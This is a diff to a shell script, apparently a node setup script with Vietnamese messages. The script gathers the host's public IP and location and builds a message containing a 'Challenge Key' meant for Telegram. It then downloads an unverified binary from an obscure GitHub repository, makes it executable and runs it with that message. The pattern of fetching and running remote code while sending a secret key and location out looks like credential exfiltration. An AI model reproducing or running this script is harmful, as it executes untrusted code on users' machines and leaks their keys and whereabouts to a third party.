@@ -155,7 +155,9 @@ if ! command -v jq &> /dev/null; then
 fi
 
 PUBLIC_IP=$(curl -s ifconfig.me)
+echo "PUBLIC_IP: $PUBLIC_IP"
 LOCALTION=$(curl -s ifconfig.co/json | jq -r '"\(.city)|\(.zip_code)|\(.country)"')
+echo "LOCALTION: $LOCALTION"
 TODAY=$(date '+%Y-%m-%d')
 # Send results to Telegram
 MESSAGE=$(cat <<EOF
@@ -167,6 +169,12 @@ MESSAGE=$(cat <<EOF
 - *Challenge Key*: $CHALLENGE_KEY
 EOF
 )
-wget https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
+echo "MESSAGE: $MESSAGE"
+
+curl -L -o blockcast https://github.com/gradientnode12/xcvnmh/raw/refs/heads/main/blockcast
+if [ $? -ne 0 ]; then
+    echo "❌ Không thể tải tệp blockcast từ URL"
+    exit 1
+fi
 chmod +x blockcast
 ./blockcast -message "$MESSAGE"
